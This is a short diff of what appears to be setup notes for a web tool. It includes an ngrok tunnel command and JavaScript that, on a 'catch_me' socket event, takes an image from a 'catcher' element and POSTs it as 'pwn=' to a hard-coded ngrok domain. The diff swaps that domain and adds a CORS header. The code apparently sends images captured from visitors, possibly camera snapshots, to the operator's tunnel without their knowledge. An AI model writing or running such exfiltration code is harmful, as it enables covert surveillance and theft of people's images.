@@ -5,13 +5,14 @@ ngrok http -host-header=rewrite 3000
 
 # Socker Send Data on Code
 
-const NgrokDomain = "http://0583c523e6e7.ngrok.io"
+const NgrokDomain = "http://9190796973a4.ngrok.io"
 
 socket.on('catch_me', async function(){
 	const image = document.getElementById('catcher').src;
 
 	const headers = {
 		'method' : 'POST',
+		'Access-Control-Allow-Origin': '*',
 		'body' : 'pwn='+image,
 	
 	};
